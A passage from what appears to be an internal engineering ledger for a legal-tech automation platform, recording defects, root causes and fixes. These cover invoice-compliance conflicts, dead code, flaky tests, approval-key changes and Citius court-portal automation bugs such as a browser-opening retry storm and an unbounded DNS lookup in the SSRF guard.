- **`h3-edit-mode-no-cancel`** (low, UX fast-follow; H3 fresh review flagged, non-blocking). The admin
  edit-mode `running` phase (`api/assets/panel-runtime/src/edit-mode.js` / `AssistantPanel.jsx`) has
  no client-side timeout, no AbortController, and no Cancel affordance - unlike the sibling visitor
  `send()` in the same panel (which got FETCH_TIMEOUT_MS + AbortController for codex-d2). Toggling the
  edit switch OFF mid-run does not abort the in-flight `runEditPatch`, so a late resolve can flip the
  phase to `preview` with stale shas. The stale-sha CONSEQUENCE is already mitigated (the H6/codex
  fix: `guardedRollback` re-reads HEAD and refuses a stale restore), so this is a UX gap not a data
  hazard. Fast-follow: mirror the visitor path - an AbortController tied to editMode-off/unmount + a
  run-generation guard + a Cancel button. Every server action stays H1-gated regardless.

### Operator-blocked / external

- **`prod-corpus-import`** (external). The real production knowledge corpus import is pending, blocked
  on operator ssh/rsync of the staged corpus. The importer CLI and the `_shared` plane are ready
  (`docs/operations-runbook.md`).
- **`remote-tag-f25`** (operator action). The remote tag `batch1-f25` still points at the broken
  commit `8a2a67b`; re-point with `git push origin +refs/tags/batch1-f25:refs/tags/batch1-f25` (local
  is already at `af8b556`).

### Featured-artifact audit (WS10 Stage A, 2026-08-08)

Full per-artifact evidence and dispositions: `docs/featured-artifacts-ledger.md` (the two review
passes done this day are merged into that one canonical file - a second, more detailed brief arrived
after the first pass had already shipped a doc at a different path; both are consolidated, nothing
dropped). Concrete defects surfaced by the review, logged here per the discovery-run rule (never
silently absorbed into a ledger note):

- **`featured-invoice-manager-noncompliant-invoicing`** (HIGH, compliance). The `invoice-manager`
  featured artifact (`api/assets/featured-artifacts/invoice-manager/scaffold/`) natively generates
  and prints fiscal-looking invoices: `InvoicesPage.jsx`'s `nextInvoiceNumber()` mints sequential
  `FT {year}/{seq}` numbers and `InvoicePrintPage.jsx` renders a full issuer/client-NIF, IVA-broken-
  out, printable document via `window.print()`. This directly contradicts the platform's own stated
  policy elsewhere in the same gallery (`legal-financas`'s manifest: "a emissão de faturas
  certificadas passa exclusivamente pela integração InvoiceXpress (AT) - a Ekoa nunca emite faturas
  nativamente") - Portuguese law requires certified invoicing software for professional fees, so a
  lawyer forking this template to bill honorários would be issuing a non-compliant fatura. Disposed
  DEMOTE in the ledger; Stage B/C should either remove the native-emission flow entirely or redirect
  it through a certified-integration stub before this artifact stays in the gallery in any form.
- **`featured-legal-spine-screenshots-unseeded`** (medium, gallery presentation). Most `legal-*`
  screenshots (`~/.ekoa/data/artifact-screenshots/legal-*.png`, captured 2026-07-18) show an empty/
  zero-data state ("Sem clientes - abra um no Núcleo", empty KPI tiles) because the capture runs the
  artifact standalone without the shared spine's demo data seeded first. Several of the affected
  artifacts (`legal-agenda`, `legal-citius`, `legal-calculos`, `legal-nucleo`, `legal-injuncoes`,
  `legal-insolvencias` among others) are functionally deep on inspection of source, but their gallery
  thumbnail currently undersells that. Recommend recapturing with the seeded spine before any Stage C
  visual "before" comparison. ROOT CAUSE, since found: `legal-nucleo`'s `DashboardPage.jsx` is the
  only scaffold with an "Instalar dados de demonstração" button (`instalarDemo()` in the family's
  shared `demo-spine.js`); nothing else ever installs the demo data, and the shared scope is keyed by
  OWNER (all 29 `legal-*` artifacts share one), so installing once via `legal-nucleo` seeds the whole
  family. FIX WRITTEN (not yet committed/tested): `ensureLegalDemoSpineInstalled()` in
  `api/src/apps/featured-builder.ts` drives that button before any `legal-*` screenshot is
  (re)captured; a deliberate-recapture CLI (`npm run tool:recapture-featured-screenshots --workspace
  api`) forces the 29 already-stale PNGs to refresh, since self-heal only fires on a missing PNG.
  Verified live in an isolated scratch stack (own MongoMemoryServer, own ephemeral port, nowhere near
  the shared dev stack) - real before/after screenshots for `legal-nucleo` (Processos Ativos 0->6,
  Prazos Vencidos/Hoje/7dias 0/0/0->1/1/3, a populated Radar de Prazos and Notificações) and
  `legal-prazos` (cross-artifact confirmation - same four cases surface via the shared owner scope).
  Stays OPEN here until the fix is committed with a test, per the ledger convention.
- **`featured-erp-imobiliario-ptbr-contamination`** (medium, copy quality, KEEP artifact). Grepped
  all 42 artifacts' scaffold source for PT-BR-only markers (`usuário`, `cadastro/cadastrar/
  cadastrado`, `celular`, `aplicativo`, `tela` as "screen"). `erp-imobiliario`'s `App.jsx` uses
  "cadastrado"/"cadastro" roughly 20 times where PT-PT says "registado"/"registo" (e.g. "Nenhum
  cliente cadastrado", "não está cadastrado. Cadastre-o antes de salvar") and "aplicativo da CGD"
  where PT-PT says "aplicação". `invoice-manager` has one instance too ("O cadastro central das
  entidades") but is already demoted for the compliance reason above, so this is moot for it. The
  entire 29-artifact `legal-*` family came back clean (`ecrã`, never `tela`; `registo`/`registar`
  throughout). `erp-imobiliario` is disposed KEEP+UPGRADE in the ledger - this PT-BR cleanup is a
  named Stage C work item, not just an observation, alongside its already-required apartment-
  portfolio de-verticalization.
- **`featured-icon-field-dead`** (low, dead code/content). All 42 featured-artifact manifests omit
  `icon` (the seeder's internal `FeaturedArtifactManifest` type declares it optional). The field is
  unused end-to-end, not 42 individual oversights: `shared/src/artifacts.ts`'s wire `Artifact` schema
  carries no `icon` field at all, and no web component under `web/components/artifacts/` or
  `chat-stripes.tsx` reads `.icon`. Someone should either wire it into the gallery card or delete it
  from the manifest interface - leaving it declared-but-ignored misleads whoever authors the next
  featured artifact.
- **`featured-seed-data-json-dead`** (low, dead code/stale comment). Eight non-`legal-*` featured
  artifacts ship a root-level `seed-data.json` alongside their scaffold
  (`api/assets/featured-artifacts/{ai-assistant,booking-system,cobrancas,ecommerce-catalog,
  help-desk,invoice-manager,sales-crm,task-manager}/seed-data.json`) that NO code path reads
  anywhere in `api/src` (grepped for the literal filename and for `seedData` - zero hits outside the
  asset directories themselves). `api/src/apps/artifact-bundle.ts`'s own header comment claims
  "featured seed-data is not carried into the bundle (seed lives in the featured catalog and is
  applied by fork)" - that comment is simply false today: there is no fork-time (or any other) code
  path that reads a featured artifact's `seed-data.json` and applies it to a new instance's
  `/api/app-data/*` rows. A stale comment asserting a mechanism that does not exist is worse than no
  comment, since the next reader will trust it. Not fixing the underlying gap here (all eight lack
  any install mechanism at all - no scaffold wires a button to consume this file the way
  `legal-nucleo`'s does for the shared spine - and four of the eight are DEMOTE candidates in
  `docs/featured-artifacts-ledger.md` anyway: `ecommerce-catalog`, `invoice-manager`, `sales-crm`,
  `task-manager`); recording it accurately is the whole ask.
- **`featured-gallery-data-hygiene`** (low, data). Two data-hygiene gaps in
  `api/assets/featured-artifacts/*/manifest.json`'s `featuredRank` (`shared/src/artifacts.ts`
  `featuredRank: z.number().int().optional()`): (1) `legal-agenda-reservas` has no `featuredRank` at
  all - schema-valid but likely an oversight, since every other artifact has one; (2) `sales-crm`
  (rank 10) and `task-manager` (rank 20) still outrank every `legal-*` artifact even though this
  audit demotes both as redundant with `legal-nucleo`/`legal-kanban` - a leftover from before the
  platform's legal specialization. Also two screenshots show a genuinely broken render rather than
  just empty data: `booking-system.png` (blank content pane, sidebar renders fine) and
  `sales-crm.png` ("Página não encontrada" 404 instead of the dashboard) - `booking-system` is
  disposed KEEP+UPGRADE and its screenshot bug should be root-caused before Stage C investment;
  `sales-crm` is disposed DEMOTE so its bug is lower priority but still real.

- **`crawl-in-flight-tests-race-under-load`** (2026-08-22, **FIXED ON MAIN by `a99c0da`** - diagnosed
  here, fixed there as its own change; **LOW, flakiness not correctness** -
  found by the S7/S8 verification lane, NOT caused by it). Two cases in
  `api/tests/contract/f5-ui-endpoints.test.ts` go red on a loaded machine and green on an idle one:
  *"a second POST while one is in flight answers alreadyRunning:true, never a duplicate run"* and the
  `crawlStatus` case that follows it. Observed once during the S7 full-suite run (2 failed of 5642)
  while other work shared the box; the SAME tree re-run idle was 417/417 green, the file alone is
  green on both trees, and pristine `main` under the same conditions is green too - so it is load,
  not the change.

  **THE MECHANISM, and it is structural rather than environmental.** The test fires the first crawl
  WITHOUT awaiting it and immediately posts a second, expecting the second to be refused as
  `alreadyRunning`. Nothing synchronises the two: the assertion holds only while the first crawl is
  still running. The seeded source is `http://127.0.0.1:1/refused-by-ssrf`, which the SSRF guard
  refuses IMMEDIATELY (`Blocked host: 127.0.0.1`, `services/url-safety.ts`), so the in-flight window
  is close to zero by construction. Under load the first crawl finishes before the second request
  lands, the refusal never happens, and the leftover progress record from that completed run is what
  reddens the `crawlStatus` case on the next line.

  **NOT FIXED HERE, deliberately, AND FIXED ON MAIN INSTEAD.** A real fix has to give the first crawl
  a measurable lifetime (a fixture host that is permitted and then stalls) or give the runner a
  barrier the test can wait on - either is a change to the knowledge-crawl test fixture, in an area
  neither S7 nor S8 touches, and landing it inside "hide the automations surface" is the kind of
  ride-along a reviewer cannot review. That is exactly how it went: the diagnosis above was recorded
  on the S7/S8 branch and the fix landed separately on main as `a99c0da`. This entry stays as the
  record of the mechanism, because the next red run of this class should be recognised rather than
  re-diagnosed - and because the three-way provenance proof (pristine main green, the same tree green
  when idle, the file green alone on both) is the method, not just the verdict.

- **`s8-consent-reword-retires-standing-approvals`** (2026-08-22, ACCEPTED with an operator note,
  **MEDIUM on a cutover, none on a fresh estate** - a consequence of slice S8's D4 copy sweep, not a
  defect in it). `action-consent.ts`'s `actionTarget` produces the destination string the write-gate
  dialog shows, and that same string is an INPUT TO THE APPROVAL KEY: `idFor(scope, integrationKey,
  actionName, shape, decision, TARGET)`. The module says so in place ("that string is what the human
  is shown AND what the approval is keyed on, so the two can never disagree"), and the property is
  deliberate - a config edit that moves the destination moves the key, so a standing approval stops
  covering a destination the human never saw.

  S8 rewords that string for automation-backed actions, from `automação <template>` to
  `sequência de passos <template>` (and the bash-cli form alongside it), because D4's whole point is
  that the word must not survive anywhere a person reads it. **The key moves with it.** Every
  standing approval for a MUTATING action whose backing is an `automationBinding` stops matching.

  **BLAST RADIUS, named rather than estimated.** Actions with `mutates: true` AND an
  `automationBinding`. In the shipped packages that is exactly one: citius `submeter_peca`. Plus any
  user-authored bound write in a tenant's own definitions, which this repo cannot enumerate from
  source. Read actions are unaffected (they never needed an approval); api-call actions are
  unaffected (their target is `METHOD baseUrl+path`, untouched).

  **IT DEGRADES SAFELY AND THAT IS WHY IT IS ACCEPTED RATHER THAN OPEN.** The consent module's own
  rule is that a key miss is a RE-PROMPT, never a failure: the next run of an affected action shows
  the dialog again with the new wording, the human approves once, and the new key stands. Nothing
  breaks, nothing runs unapproved, and no approval is widened - the fail direction is toward asking.

  **OPERATOR NOTE FOR THE CUTOVER.** On a deploy carrying S8, expect one re-approval per user per
  affected action. It is invisible on the dev estate (approvals are seeded, if they exist at all) and
  visible on a production cutover, so it belongs in that runbook rather than in a release note nobody
  reads. Not fixed by keying the approval on a stable token instead of the display string: that is a
  change to the WRITE GATE's key derivation - an auth-class change needing its own adversarial review
  - and it would retire exactly the same set of approvals on the way through, so it buys nothing here
  and costs a review.

- **`s8-automation-authoring-components-unreachable`** (2026-08-22, OPEN, **LOW, with a review date
  that is already fixed** - dead code created deliberately and named rather than left to be
  rediscovered). S8 replaced `/automations` and `/automations/[id]` with redirects and deleted
  `/automations/new`. Those three pages were the only importers of fourteen files under
  `web/components/automations/`: `automation-empty-state`, `goal-editor`, `run-activity-bar`,
  `run-history`, `run-viewer`, `step-list`, `trigger-picker` directly, and `step-card`, `inline-edit`,
  `integration-action-picker`, `step-forms`, `step-type-selector`, `sub-automation-picker`,
  `consent-dialog` transitively through those - **plus the three panels under
  `web/components/automations/results/`** (`api-call-result-panel`, `ekoa-action-result-panel`,
  `local-command-result-panel`), whose only importer is `run-viewer.tsx`. **THE ORPHAN SET IS
  SEVENTEEN FILES, NOT FOURTEEN**, corrected in the review round (F9): the first count omitted the
  `results/` directory entirely, so a cleanup driven by this list at the Rule 10 review date would
  have left three dead files behind.

  Most of the `automations` locale slice (`list`, `emptyState`, `editor`, `newPage`, `goalEditor`,
  `steps`, `stepList`, `stepTypes`, `forms`, `integrationPicker`, `subAutomationPicker`, `consent`,
  `runViewer`, `runActivityBar`, `triggerPicker`) goes with them. **`runHistory` DOES NOT** - also
  corrected in the review round: `web/components/integrations/action-detail.tsx` reads
  `automations.runHistory.status`, deliberately, as shared copy on the live S2 detail page, and its
  own comment says so. Deleting that subtree would have been caught by the locale types lockstep at
  compile time, but the entry naming it as orphaned was wrong. **`automation-empty-state` is the one
  worth naming twice**: its primary button pushes `/automations/new`, which now answers 410 - inert
  only because nothing renders it.

  **STILL REACHABLE, and verified so at the end of the slice**: `pause-for-user-overlay` and
  `pause-for-user-canvas` (mounted by both layouts - the overlay pops for headless runs whatever
  started them), `web/stores/automations.ts` (the overlay, the schedules form, the schedule detail
  page and the `[id]` redirect all read it) and `web/hooks/useAutomationRun.ts` (the dashboard
  layout). Those three are on S8's untouched list and are untouched.

  **WHY IT IS NOT SWEPT IN THIS SLICE, and this is a decision rather than an omission.** S7 opened a
  Rule 10 state migration with **REVIEW DATE 2026-11-14**: by then the wrapper-minting write half
  lands or the migration report is deleted. The authoring surface is plausibly an input to that work,
  and a fourteen-file deletion riding inside a hide slice is a second change wearing the first one's
  clothes - the exact shape a reviewer cannot review. **This entry closes at the S7 review date, on
  the same day and by the same decision**: if the migration lands and does not use these components,
  they go; if the migration is removed, they go with it.

  **WHY THIS IS NOT THE DEAD-BINDING CLASS this ledger has logged four times.** Every prior instance
  (`screenshot-erasure-path-has-no-production-caller`,
  `the-attended-session-ceremony-was-built-tested-and-unreachable`,
  `m365proxy-manifest-flag-stripped`, `P4.2-was-dead-code-in-production`) was code that LOOKED like
  coverage: a correct, tested function kept plausible by a docblock describing a caller it never got.
  Nothing here claims to be reachable, and this entry is the record that it is not.

- **`a-shipped-package-cannot-learn-a-recipe-because-the-org-has-no-definition-row`** (2026-09-01,
  **FIXED same day** by owner decision - D-RECIPE-OVERLAY in `docs/decisions.md`; the RESIDUE below
  stays open, MINOR). Found completing the citius acceptance loop live - the FIRST time the whole
  learn pipeline ran end to end: ceremony captured, session reused across runs, the 8-step authored
  automation drove the authenticated fixture, 4 exchanges captured, 2 compiled into injectable
  calls, evidence landed - and `putRecipe` answered `notfound`, honestly: recipes are tenant data
  on the org's OWN definition row, and an org running the SHIPPED `citius` package has no row. The
  owner chose the THIN OVERLAY over fork-on-learn (which would shadow the baseline and cut the org
  off from shipped updates) and over config-row storage (a second recipe home): `putRecipe` now
  materialises a `origin.kind: 'recipe-overlay'` carrier row from the disk baseline when the
  learning caller names the run owner, and every definition-resolution surface skips carrier rows
  (`isRecipeOverlay`). Suite: `recipe-store.test.ts`, the D-RECIPE-OVERLAY block. RESIDUE (OPEN,
  MINOR): an org learning on a FOREIGN `global` row - another tenant's publication rather than the
  disk baseline - still cannot store; `materialiseOverlayRow` consults only
  `getBaselineDefinition`, and widening it means deciding whose action stubs a carrier copies when
  the publisher republishes.

## Recently fixed - 2026-09-01 the first live bridge run of a shipped Citius action (dev-madrid)

The first execution of `consultar_notificacoes` with a connected bridge - the leg no machine had
reached (the Mac stopped at "no machine paired") - drove a real headed browser onto the REAL
`citius.tribunaisnet.mj.pt` instead of the tenant's configured fixture, and then retried that
excursion at 1s/2s/4s… under the listener supervisor. Three defects in one chain, each with a
committed test:

- **`config-values-dropped-at-the-automation-backed-seam`** (**FIXED 2026-09-01**, action seam;
  found live). `bf3c46a` built both ends of the pipe - the executor sends
  `configValues` (`action-executor.ts`, `publicConfigWithDefaults`) and `ActionRunInput` accepts
  them onto `RunContext.configValues` - but `automationBackedActionHandler`, the ONE mapping where
  the two shapes meet, never forwarded the field, and NEITHER structural seam type declared it
  (the executor spread it into the literal; the compiler had nothing to check against). Every
  `{{config.…}}` in every shipped template resolved to the empty string. Fix: the field is
  forwarded and DECLARED on both sides of the seam (`AutomationBackedCall`,
  `AutomationBackedHandler`). Tests: `replay-mount.test.ts` ("carries the CONFIG VALUES onto the
  run context" + the absent-field Rule 7 case).

- **`an-empty-navigate-invited-the-fixer-to-invent-a-destination`** (**FIXED 2026-09-01**, engine;
  found live - this is the ledgered `the-rehearsal-fixer-may-relocate-a-run-to-any-origin`
  OBSERVED IN PRODUCTION SHAPE). With `{{config.portal_url}}` resolved to '', the navigate case
  threw a recoverable "missing url", the fixer's prompt ("navigate_failed usually wants
  replace_current with a different URL") did exactly what it teaches, and the model authored the
  real CITIUS portal address from world knowledge. The run record shows the splice: step 0 carries
  a model-vocabulary id (`open-citius-mandatarios`) beside the template's own
  `confirmar-autenticacao`. Fix: a navigate with no destination after template resolution fails
  NON-RECOVERABLY, naming the authored template that emptied (`authoredStep` now crosses
  `ExecuteStepArgs`); the fixer is never consulted for a lost address, because the address of a
  navigate is the owner's fact. Test: `engine.test.ts` ("a navigate whose template resolved to
  NOTHING halts naming the template"). The GENERAL fixer-origin question stays OPEN below - this
  closes only the invented-destination entry to it.

- **`listener-supervisor-retries-a-credential-halt-as-if-transient`** (**FIXED 2026-09-01**,
  events; found live on dev-madrid at the same hour the owner watched the same storm on another
  machine - nine runs in ~10 minutes against a national court portal's public login page). Two
  sessions fixed it in parallel; the fuller fix (the section below: `ListenerPollError` carrying
  code AND engine status, the dedicated 15min→30min→60min blocked ramp on its own streak) is the
  one that ships. The dev-madrid test pinning the `needs_credentials` code path is kept beside its
  `awaiting_daemon`-status sibling in `listener-supervisor.test.ts`.

## Recently fixed - 2026-09-01 a blocked listener opened a browser window on a loop

- **`a-blocked-listener-retries-from-one-second-and-opens-a-window-every-time`** (FIXED 2026-09-01,
  **HIGH**, correctness/safety - reported by the owner, who watched it happen). The listener
  supervisor treated EVERY poll failure as transient and applied `RESTART_BACKOFF_MS`, which starts
  at **one second**. That is a reasonable policy for a cheap probe and a disastrous one here: an
  automation-backed poll RUNS THE AUTOMATION, so with `desktop.automation` granted every attempt
  OPENS A REAL BROWSER WINDOW on the owner's desktop. A Citius listener with no captured session
  therefore opened a window at 1s, 2s, 4s, 8s, 16s, 32s, 60s and then once a minute, **against the
  live www.citius.mj.pt portal**, for as long as the daemon stayed up - the owner had to ask for it
  to be stopped, and it was only stoppable by killing the daemon by hand.

  **THE ROOT CAUSE IS PROSE.** `user-defined-poll.ts` knew the outcome code and interpolated it into
  a message string before throwing a plain `Error`, so everything downstream had only text. A
  backoff cannot be chosen from text, so there was only one backoff.

  **FIXED** by making the reason survive the throw (`ListenerPollError`, carrying `code` and the
  engine `runStatus`) and giving the supervisor a second, slow cadence for outcomes no retry can
  change: `BLOCKED_BACKOFF_MS` = 15min -> 30min -> 60min, floored at the listener's own healthy
  interval, with its own streak so a block never advances the failure ramp and a failure never
  advances the blocked one. The audit row is still written - a blocked listener must stay as visible
  as a failing one, it must simply stop hammering.

  **THE CLASSIFICATION HAD TO READ THE STATUS, NOT JUST THE CODE**, and this is the part a
  code-only fix would have missed: the live case was a locality refusal ("no machine is paired to
  your account"), which `runAutomationForAction` returns as the GENERIC `code: 'automation_failed'`
  with the real state on `data.status` (`awaiting_daemon`). Both are read.

  This is the argument `schedules/supervisor.ts` already made for the other rail
  (`mapIntegrationOutcome` calling `awaiting_consent`/`needs_credentials` blocked;
  `NEUTRAL_BACKOFF_BASE_MS` existing because exempting a block from the ceiling "removed the only cap
  on REPEATING it"), applied to the rail that never got it - the same shape as the
  listener-kind-inference gap fixed the day before. Suites:
  `api/tests/events/listener-blocked-backoff.test.ts` (8, the policy pinned by its numbers as a pure
  function) and a supervisor-level case in `api/tests/events/listener-supervisor.test.ts` proving one
  poll and then silence where the old code polled repeatedly. Both mutation-verified.

  **WHAT THIS DOES NOT FIX, stated plainly.** A blocked poll still OPENS A WINDOW to discover it is
  blocked - just 24 times a day at worst instead of ~1440, and never in the first quarter of an hour.
  The honest fix is for an automation-backed poll to learn it has no session WITHOUT driving a
  browser, which means the credential gate answering before the engine opens anything. That is a
  larger change on the run loop and is NOT done: see the OPEN finding below.

- **`the-ssrf-guards-dns-lookup-was-unbounded-so-the-callers-timeout-bounded-nothing`** (FIXED
  2026-09-01, MEDIUM, robustness - found chasing a test flake in the run that verified the listener
  fix). `guardedFetchFollow` calls `assertResolvedIpsSafe(hostname)` on every hop, which awaits
  `dns.lookup` with NO timeout, and it does so BEFORE the `AbortController` that bounds the fetch. So
  `opts.timeoutMs` - the only timeout a caller can express - did not bound the operation it names: a
  slow or wedged resolver hung the whole guarded fetch for as long as the OS resolver took, and the
  caller's timer never got the chance to fire. The visible symptom was
  `tests/integrations/docx-fetch.test.ts` "blocks a redirect hop to a private target" timing out at
  30s under the full parallel suite while passing in 91ms alone: it stubs `fetch` but cannot stub
  DNS, so it makes a REAL lookup for example.com. FIXED with a 5s cap (`DNS_LOOKUP_TIMEOUT_MS`),
  shorter than the fetch budget on purpose. A timeout is treated exactly as a resolution failure, and
  that is safe for the reason the early `return` was always safe: it is reached only when NO address
  was obtained, so no address goes unexamined - losing the race does not skip a check, it means there
  was nothing to check. NOT DIRECTLY PINNED BY A TEST: `dns.lookup` has no injection seam in this
  module, so adding one would be a larger change than the fix; what is verified is that the affected
  suites pass and that the flake's mechanism is gone. Stated as a gap rather than claimed as covered.

- **`an-automation-backed-poll-opens-a-browser-to-discover-it-has-no-session`** (OPEN 2026-09-01,
  MEDIUM, design - the residue of the finding above). Even on the slow cadence, each blocked attempt
  starts a real run, opens a real window and drives it as far as the locality/credential refusal
  before halting. The window is the cost of ASKING, and asking is what we already know the answer to:
  the Cofre knows there is no usable session for the origin, and the fleet knows there is no paired
  machine, both before a browser is needed. CLOSE BY letting the poll path get that answer without a
  browser - the credential gate and `resolveLocality` already compute it for the run loop, so this is
  a matter of consulting them earlier rather than new logic. Until then a blocked listener costs at
  most 24 windows a day and none in the first 15 minutes, which is survivable but not right.


## Recently fixed - 2026-08-31 making the shipped Citius package able to run at all

Four defects found by trying to run a shipped integration package end to end for the first time.
None was visible from the code: each needs the package, the provisioner, the engine and a portal in
the same room. Two of them made every automation-backed action on every shipped package useless.

- **`a-recipe-replay-carries-no-cofre-session-so-a-401-is-misread-as-drift`** (FIXED 2026-08-31 in
  975fba2a, **HIGH**, replay spine; found running the cornerstone acceptance runbook live). The
  replay leg opened a daemon browser through `openOwnerBrowserSession` WITHOUT the `sessionState`
  the class accepts, so no `session.deliver` frame was ever sent for a replay (verified live by
  counting frames: two authored runs produced two, the replay produced none) and the replay drove a
  signed-out jar. Worse than a miss: `injected-call.ts` read the presence of a BROWSER as the
  presence of an AUTHENTICATED session, so the portal's 401 was classified as SITE DRIFT and the
  recipe superseded v1 -> v2 against a fixture that had not changed. Every run re-learned; the
  promised zero-model replay never happened for a session-gated portal, which is the case the
  cornerstone exists to showcase. FIXED both halves: `replay-action.ts` resolves the Cofre session
  for the recipe's origin through the SAME `ensureSession` checkout the authored run uses (accepting
  only `reused`) and passes it as `sessionState`; and `executors/injected-call.ts` answers
  `unavailable` rather than drift for a 401/403 on a replay whose session was never delivered, so a
  missing session can no longer consume the heal budget. Suites:
  `api/tests/automation/injected-call-replay.test.ts`, `api/tests/automation/replay-*`. The
  zero-model replay leg was then proven live at 592ms against a 5173ms authored run.

- **`automation-step-text-is-never-interpolated`** (FIXED 2026-08-31, **HIGH**, correctness).
  Nothing in the engine interpolated a step's `description`, `expectedOutcome` or `url`. `engine.ts`
  passed `step.description` to the vision resolver and `step.url` to `browser.act` exactly as
  authored, so the shipped citius template that says "introduzir o numero unico de processo
  '{{input.numeroProcesso}}' e submeter a pesquisa" instructed the model to type those twenty-four
  literal characters into the portal's search box, and a `navigate` step could not be pointed
  anywhere but the address written in its own JSON. Every shipped template naming an input in its
  prose was affected - all four citius ones - and so is any planner output that does the same. The
  failure is SILENT: the run completes, the model does something plausible with the nonsense, and
  the answer is about the wrong process. FIXED by `resolveStepTemplates` (`automation/template-vars.ts`)
  plus a second view in the engine: `workingSteps` keeps the authored text (it is what
  `persistRefinedSteps` writes back), `executableSteps` is what the vision prompt, the navigate URL
  and the origin walk read. Resolving in place was rejected - it would bake one run's arguments into
  the saved automation, so the next run searches for the previous run's process number. Pinned by
  five cases in `api/tests/automation/engine.test.ts`, four of which a mutation (reverting the one
  line) kills; the fifth pins that the SAVED steps keep their placeholders. The credential boundary
  is `interpolate`'s existing redaction and is pinned too: `{{input.credentials.password}}` in a step
  description resolves to the empty string, never to the secret.

- **`integration-config-values-never-reach-an-automation`** (FIXED 2026-08-31, MEDIUM, correctness).
  A package could declare a `configSchema` field that nothing on the automation path could read. The
  citius package declares `portal_url` with the help text "Endereco do Portal dos Mandatarios. Por
  omissao https://portal.tribunais.org.pt" - a default stated only in prose - while the address was
  hardcoded in four templates AND in `sessionConnect.loginUrl`. So the field moved nothing: a tenant
  on a staging portal, an on-premise deployment or a fixture had no way to say so. FIXED with a
  `{{config.<key>}}` channel fed from `publicConfigValues` (the projection built by dropping every
  secret key, so there is no secret in it by construction), a declared `defaultValue` on the config
  field, and `publicConfigWithDefaults` applying defaults at READ time so a package upgrade can move
  a default. `sessionConnect.loginUrl` resolves through the SAME values on purpose: a captured
  session is bound to the origin its ceremony opened, so if the ceremony and the automations could
  disagree about the address the result is a session banked that no run can check out. Suites:
  `api/tests/integrations/config-defaults.test.ts` (6, incl. "a stored empty string is unanswered"
  and "never default a secret field"), plus the contract pins in
  `api/tests/contract/integration-definitions.test.ts`. VERIFIED LIVE: the ceremony address for a
  tenant configured with the fixture reads `http://127.0.0.1:45190`, not the hardcoded portal.

- **`knowledge-backfill-counts-a-16gb-fts-index-on-every-boot`** (FIXED 2026-08-31, **HIGH**,
  performance/availability). `backfillKnowledgeIndex` decided "is the index already populated" with
  `index.totalRows()`, i.e. `SELECT COUNT(*) FROM knowledge_fts` - a FULL SCAN of an FTS5 table, on
  a path that runs BEFORE `listen()`. On this machine (`fts.db` 16 GB + a 128 MB WAL) that scan ran
  for over twelve minutes with the API answering nothing, which reads as a hung stack; it was found
  by sampling the process and seeing `fts5NextMethod` under `Statement::JS_get` on the main thread.
  FIXED with `hasAnyRows()` (`SELECT 1 ... LIMIT 1`), which answers the question actually asked and
  costs the same on an empty index and on a huge one. `totalRows()` is kept, with a docblock saying
  never to call it on a boot path. MEASURED: boot went from >12 minutes (timing out) to **100
  seconds** on the same data dir.

- **`a-package-listener-trigger-is-created-as-a-webhook-nothing-polls`** (FIXED 2026-08-31,
  **HIGH**, correctness). `createTrigger`'s `listenerStamp` inferred `kind: 'listener'` for platform
  mailboxes only. Its own docblock states the reason - a provider with NO WEBHOOK INGRESS gets "a
  webhook-kind row NOTHING polls: a silently dead mailbox watch that reports success" - and then
  leaves the identical hole open for a user-defined package that declares its own `listenerConfig`,
  which is polled by the SAME supervisor down the 2A-S4 branch and has no ingress either. Found live
  creating the trigger the shipped `citius` package exists for: `POST /api/v1/triggers` with
  `citius`/`notificacao.recebida` answered `201` with `"kind": "webhook"` and a `publicUrl` nobody
  will ever call. Every surface would have shown it connected; no notification would ever have
  arrived. FIXED by extending the inference to a tenant-scoped package `listenerConfig`, gated on the
  event being one the package DECLARES - inferring for an undeclared event would be worse than the
  default, a poll loop running forever for something that can never appear. The caller may still
  override the cadence, never the poll action. Suite:
  `api/tests/events/trigger-create-inference.test.ts` (+3 cases).
  ALSO FIXED, the UI half: `web/components/artifacts/backend-trigger-card.tsx` listed only connected
  mailboxes and hardcoded `eventName: 'email.received'`, so an artifact backend listening to
  anything else could not be wired at all - and the one control it offered would have bound the
  handler to an event its source never emits. It now unions the mailboxes with every ENABLED
  integration's declared `listenerEvents` and carries the chosen source's own event name. Suite:
  `web/__tests__/components/backend-trigger-card.test.tsx` (5 cases; the event-name assertion is
  mutation-verified).

- **`a-re-pair-silently-erases-the-operator-decisions-on-the-config`** (FIXED 2026-08-31, **HIGH**,
  bridge tooling; found re-pairing after the ephemeral dev Mongo was wiped). `pair` carried `org` and
  `signingSecret` forward across a re-pair and DROPPED `extraCapabilities` and `egressProxy`. Both
  losses are silent and both misdirect:
  (1) `desktop.automation` is a tier-2 opt-in that exists ONLY as this config edit - deliberately,
  because it is not something a UI may switch on. Erased, the daemon stops advertising it, so Cortex
  has nothing to grant and every attended flow refuses with "A Ponte Ekoa ligada é demasiado antiga
  para capturar sessões" - a message about a VERSION, which sends the operator to upgrade software
  that is already current.
  (2) `egressProxy` erased means no residential endpoint is served, so no `egress.residential` is
  advertised, so `checkoutSession` withholds the session THIS MACHINE just captured - i.e. a re-pair
  re-opened the HIGH finding `a-ceremony-session-is-unusable-on-the-machine-that-established-it`
  whose fix had already landed. FIXED by carrying both forward (by PRESENCE, so an explicit
  `egressProxy: false` is respected as an answer), with the reasoning on the command's docblock.
  Suite: `clients/bridge/test/cli/cli.test.ts` (+2, mutation-verified). VERIFIED IN THE WILD: a
  re-pair on this machine minted a new pairing id and kept both settings.

- **`the-dev-driver-cannot-grant-its-own-bridge-residential-egress`** (FIXED 2026-08-31, MEDIUM,
  tooling; found granting capabilities to a freshly paired local bridge). A paired bridge serves its
  residential egress proxy on `127.0.0.1:8792`, and `normaliseEgressEndpoint` refuses a loopback
  address unless `EKOA_BRIDGE_ALLOW_PRIVATE_EGRESS` is set - a closed default that is right for a
  deployment and fatal for a local loop. The dev driver never set it, so `POST
  /bridge/pairings/:id/capabilities` rejected the `egress.residential` grant with "must be a usable
  proxy address" and the committed acceptance runbooks could not be completed on a dev box at all:
  without that grant the daemon's own freshly captured session is withheld from the machine that
  captured it. The switch's own docblock says it exists for "a developer running a proxy on their
  own machine", which is exactly this. FIXED in `.claude/skills/run-ekoa-code/driver.mjs` (an
  explicit environment value still wins), documented as a gotcha in the skill.

- **`artifact-pdf-contract-test-flakes-on-the-default-30s-timeout`** (FIXED 2026-08-31, LOW, test
  flakiness). `artifact-family.test.ts`'s "rejects an unsafe id 400 and degrades a valid id to 302 or
  503" had no explicit timeout, but the route it drives LAUNCHES CHROMIUM and renders a page to PDF.
